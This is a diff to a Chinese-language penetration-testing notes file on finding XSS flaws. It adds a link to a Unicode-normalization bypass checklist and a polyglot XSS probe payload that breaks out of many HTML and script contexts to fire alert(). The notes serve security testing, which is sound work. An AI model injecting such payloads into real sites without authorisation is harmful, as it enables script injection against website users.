@@ -25,6 +25,12 @@ ls -lah xss.doc
 
 
 
+
+
+unicode绕过checklist:
+
+https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
+
 ## 挖掘XSS技巧
 
 ### 组件漏洞
@@ -43,6 +49,16 @@ Payload:
 
 ```
 1.iconUrl=XSS
+```
+
+
+
+## 探测XSS的payload
+
+Polyglot payload:
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
 
